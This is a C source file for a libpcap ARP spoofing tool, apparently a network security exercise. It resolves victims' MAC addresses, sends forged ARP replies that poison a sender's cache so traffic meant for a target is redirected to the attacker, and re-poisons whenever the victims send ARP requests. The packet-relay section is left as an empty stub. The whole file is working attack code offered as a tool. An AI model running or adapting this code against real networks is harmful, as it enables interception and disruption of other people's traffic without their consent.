#include "arp_spoof.h"

int main(int argc, char *argv[]){
	char *interface;
	char *senderIP, *targetIP;
	int i;
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct spoofArgs *head = NULL;
	struct spoofArgs *newArg, *tmpArg;
	struct in_addr myIP, *tSenderIP, *tTargetIP;
	struct macAddr myMAC, *tSenderMAC, *tTargetMAC;
	struct pcap_pkthdr *header;
	const u_char *rcvdPacket;
	int result;
	struct ether_header *etherHDR;
	struct arphdr *arpHDR;

	if( argc < 4 ){
		usage( argv[0] );
	}

	interface = argv[1];
	handle = pcap_open_live( interface, BUFSIZ, 1, 1000, errbuf );
	if( handle == NULL ){
		fprintf( stderr, "Couldn't open device %s: %s\n", interface, errbuf );
		return -1;
	}

	resolveMyMAC( &myMAC, interface );
	resolveMyIP( &myIP, interface );

	for( i = 2; i + 1 < argc; i += 2 ){
		senderIP = argv[i];
		targetIP = argv[i+1];

		newArg = (struct spoofArgs*)malloc(sizeof(struct spoofArgs));

		newArg->handle = handle;
		if( inet_pton(AF_INET, senderIP, &(newArg->senderIP) ) != 1 ){
			fprintf( stderr, "Invalid IP : %s\n", senderIP);
			continue;
		}

		if( inet_pton(AF_INET, targetIP, &(newArg->targetIP) ) != 1 ){
			fprintf( stderr, "Invalid IP : %s\n", targetIP);
			continue;
		}

		memcpy(&(newArg->myIP), &myIP, sizeof(struct in_addr));
		memcpy(&(newArg->myMAC), &myMAC, sizeof(struct macAddr));

		resolveMAC( &(newArg->senderMAC), &(newArg->myMAC), &(newArg->senderIP), &(newArg->myIP), handle );
		resolveMAC( &(newArg->targetMAC), &(newArg->myMAC), &(newArg->targetIP), &(newArg->myIP), handle );

		infectARP( &(newArg->senderMAC), &(newArg->senderIP), &(newArg->myMAC), &(newArg->targetIP), handle );

		for( tmpArg = head; tmpArg != NULL && tmpArg->next != NULL; tmpArg = tmpArg->next);

		if( tmpArg == NULL ){
			head = newArg;
		}
		else{
			tmpArg->next = newArg;
		}
	}

	// TimeSpoof
	while(1){
		result = pcap_next_ex( handle, &header, &rcvdPacket );
		tmpArg = head;
		etherHDR = (struct ether_header *)rcvdPacket;
		if( etherHDR->ether_type == htons(ETHERTYPE_IP) ){
			/// FIND CORRESPONDING TARGET AND RELAY
		}
		else if( etherHDR->ether_type == htons(ETHERTYPE_ARP) ){
			/// CHECK IF ARP WILL RECOVER AND INFECT AGAIN
			/*
			1. If Request
				1. If Sender and Targets are in the list, InfectARP
				2. If Broadcast by Target, InfectARP
				3. If Broadcast by Sender, InfectARP 
			*/
			arpHDR = (struct arphdr*)((char *)etherHDR + sizeof(struct ether_header));
			if( (htons(arpHDR->ar_hrd) == ARPHRD_ETHER &&
				htons(arpHDR->ar_pro) == ETHERTYPE_IP &&
				arpHDR->ar_hln == sizeof(struct macAddr) &&
				arpHDR->ar_pln == sizeof(struct in_addr) &&
				htons(arpHDR->ar_op) == ARPOP_REQUEST) ){

				tSenderIP = (struct in_addr*)((char*)arpHDR + sizeof(struct arphdr) + sizeof(struct macAddr));
				tTargetIP = (struct in_addr*)((char*)arpHDR + sizeof(struct arphdr) + sizeof(struct macAddr) * 2 + sizeof(struct in_addr));
				
				tmpArg = head;
				while(tmpArg){
					if( !memcmp(tSenderIP, &(tmpArg->senderIP), sizeof(struct in_addr)) || !memcmp(tTargetIP, &(tmpArg->targetIP), sizeof(struct in_addr))){
						usleep(50000);
						infectARP( &(tmpArg->senderMAC), &(tmpArg->senderIP), &(tmpArg->myMAC), &(tmpArg->targetIP), handle );
					}
					tmpArg = tmpArg->next;
				}
			}
		}
	}
}


int infectARP( struct macAddr *senderMAC, struct in_addr *senderIP, struct macAddr *myMAC, struct in_addr *gatewayIP, pcap_t *handle){
	struct ether_header etherHDR;
	struct arphdr       arpHDR;
	uint8_t *packet;
	uint32_t offset = 0;
	uint32_t packetSize;
	struct pcap_pkthdr *header;

	printf("INFECTING!!!\n");

	memcpy( etherHDR.ether_dhost, senderMAC, sizeof(struct macAddr) );
	memcpy( etherHDR.ether_shost, myMAC, sizeof(struct macAddr) );
	etherHDR.ether_type = htons(ETHERTYPE_ARP);

	arpHDR.ar_hrd = htons(ARPHRD_ETHER);
	arpHDR.ar_pro = htons(ETHERTYPE_IP);
	arpHDR.ar_hln = sizeof(struct macAddr);
	arpHDR.ar_pln = sizeof(struct in_addr);
	arpHDR.ar_op  = htons(ARPOP_REPLY);

	packetSize = sizeof(struct ether_header) + sizeof(arpHDR) + 2 * sizeof(struct macAddr) + 2 * sizeof(struct in_addr);
	printf("%d\n", packetSize);
	packet = (uint8_t*)malloc( packetSize );

	memcpy( packet + offset, &etherHDR, sizeof(struct ether_header) );
	offset += sizeof(struct ether_header);
	memcpy( packet + offset, &arpHDR, sizeof(arpHDR) );
	offset += sizeof(arpHDR);
	memcpy( packet + offset, myMAC, sizeof(struct macAddr) );
	offset += sizeof(struct macAddr);
	memcpy( packet + offset, gatewayIP, sizeof(struct in_addr) );
	offset += sizeof(struct in_addr);
	memcpy( packet + offset, senderMAC, sizeof(struct macAddr) );
	offset += sizeof(struct macAddr);
	memcpy( packet + offset, senderIP, sizeof(struct in_addr) );

	if( pcap_sendpacket( handle, packet, packetSize ) ){
		exit(1);
	}

	return 0;
}

struct macAddr *resolveMyMAC( struct macAddr *myMAC, char *interface ){
#ifdef MACOSX  // Ref : https://stackoverflow.com/questions/10593736/mac-address-from-interface-on-os-x-c
	int         mib[6];
	size_t      len;
	char        *buf;
	unsigned char       *ptr;
	struct if_msghdr    *ifm;
	struct sockaddr_dl  *sdl;

	mib[0] = CTL_NET;
	mib[1] = AF_ROUTE;
	mib[2] = 0;
	mib[3] = AF_LINK;
	mib[4] = NET_RT_IFLIST;

	if ((mib[5] = if_nametoindex(interface)) == 0) {
		perror("if_nametoindex error");
		exit(2);
	}

	if (sysctl(mib, 6, NULL, &len, NULL, 0) < 0) {
		perror("sysctl 1 error");
		exit(3);
	}

	if ((buf = (char*)malloc(len)) == NULL) {
		perror("malloc error");
		exit(4);
	}

	if (sysctl(mib, 6, buf, &len, NULL, 0) < 0) {
		perror("sysctl 2 error");
		exit(5);
	}

	ifm = (struct if_msghdr *)buf;
	sdl = (struct sockaddr_dl *)(ifm + 1);
	ptr = (unsigned char *)LLADDR(sdl);

	memcpy( myMAC, ptr, sizeof(struct macAddr) );
	return myMAC;
#endif
#ifndef MACOSX // Ref : https://stackoverflow.com/questions/1779715/how-to-get-mac-address-of-your-machine-using-a-c-program
	struct ifreq s;
	int fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_IP);

	strcpy(s.ifr_name, interface);
	if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
		memcpy( &myMAC, s.ifr_addr.sa_data, sizeof(struct macAddr) );
	}
	else{
		exit(1);
	}
	close(fd);
	return myMAC;

#endif
}

struct in_addr *resolveMyIP(struct in_addr *myIP, char *interface) // Ref : https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
{
	struct ifaddrs *ifaddr, *ifa;
	int family, s;
	char host[NI_MAXHOST];

	if (getifaddrs(&ifaddr) == -1)
	{
		perror("getifaddrs");
		exit(EXIT_FAILURE);
	}


	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
	{
		if (ifa->ifa_addr == NULL)
			continue;

		s=getnameinfo(ifa->ifa_addr,sizeof(struct sockaddr_in),host, NI_MAXHOST, NULL, 0, NI_NUMERICHOST);

		if( (strcmp(ifa->ifa_name,interface)==0)&&( ifa->ifa_addr->sa_family==AF_INET) )
		{
			if (s != 0)
			{
				printf("getnameinfo() failed: %s\n", gai_strerror(s));
				exit(EXIT_FAILURE);
			}
			if( inet_pton( AF_INET, host, myIP ) == 1 ){
				return myIP;
			}
		}
	}

	freeifaddrs(ifaddr);

	return NULL;
}


struct macAddr *resolveMAC( struct macAddr *senderMAC, struct macAddr *myMAC, struct in_addr *senderIP, struct in_addr *myIP, pcap_t *handle ){
	struct ether_header etherHDR, *retherHDR;
	struct arphdr       arpHDR, *rarpHDR;
	struct in_addr *rsenderIP;
	struct macAddr *rsenderMAC;
	uint8_t *packet;
	uint32_t offset = 0;
	uint32_t packetSize;
	struct pcap_pkthdr *header;
	const u_char *rcvdPacket;
	int result;
	int i;

	memcpy( &(etherHDR.ether_dhost), "\xFF\xFF\xFF\xFF\xFF\xFF", sizeof(struct macAddr) );
	memcpy( &(etherHDR.ether_shost), myMAC, sizeof(struct macAddr) );
	etherHDR.ether_type = htons(ETHERTYPE_ARP);

	arpHDR.ar_hrd = htons(ARPHRD_ETHER);
	arpHDR.ar_pro = htons(ETHERTYPE_IP);
	arpHDR.ar_hln = sizeof(struct macAddr);
	arpHDR.ar_pln = sizeof(struct in_addr);
	arpHDR.ar_op  = htons(ARPOP_REQUEST);

	packetSize = sizeof(etherHDR) + sizeof(arpHDR) + 2 * sizeof(struct macAddr) + 2 * sizeof(struct in_addr);
	packet = (uint8_t *)malloc( packetSize );

	memcpy( packet + offset, &etherHDR, sizeof(struct ether_header) );
	offset += sizeof(etherHDR);
	memcpy( packet + offset, &arpHDR, sizeof(arpHDR) );
	offset += sizeof(arpHDR);
	memcpy( packet + offset, myMAC, sizeof(struct macAddr) );
	offset += sizeof(struct macAddr);
	memcpy( packet + offset, myIP, sizeof(struct in_addr) );
	offset += sizeof(struct in_addr);
	memcpy( packet + offset, "\x00\x00\x00\x00\x00\x00", sizeof(struct macAddr) );
	offset += sizeof(struct macAddr);
	memcpy( packet + offset, senderIP, sizeof(struct in_addr) );


	if( pcap_sendpacket( handle, packet, packetSize ) ){
		exit(1);
	}

	while(1){
		result = pcap_next_ex( handle, &header, &rcvdPacket );
		if( result < 0 ){
			exit(1);
		}
		else if( result == 0 ){
			if( pcap_sendpacket( handle, packet, packetSize ) ){
				exit(1);
			}
			continue;
		}

		retherHDR = (struct ether_header *)rcvdPacket;
		if( htons(retherHDR->ether_type) != ETHERTYPE_ARP ){
			continue;
		}

		rarpHDR = (struct arphdr*)((char *)retherHDR + sizeof(struct ether_header));
		if( !(htons(rarpHDR->ar_hrd) == ARPHRD_ETHER &&
					htons(rarpHDR->ar_pro) == ETHERTYPE_IP &&
					rarpHDR->ar_hln == sizeof(struct macAddr) &&
					rarpHDR->ar_pln == sizeof(struct in_addr) &&
					htons(rarpHDR->ar_op) == ARPOP_REPLY) ){
			continue;
		}
		rsenderIP = (struct in_addr*)((char*)rarpHDR + sizeof(struct arphdr) + sizeof(struct macAddr) );
		if(memcmp(rsenderIP, senderIP, sizeof(struct in_addr))){
			continue;
		}

		rsenderMAC = (struct macAddr*)((char*)rarpHDR + sizeof(struct arphdr));
		memcpy( senderMAC, rsenderMAC, sizeof(struct macAddr) );
		break;
	}

	return senderMAC;
}




void usage( char *progName ){
	printf( "Usage: %s <interface> <sender1 ip> <target1 ip> [ <sender2 ip> <target2 ip> ... ]\n", progName );
	exit(1);
}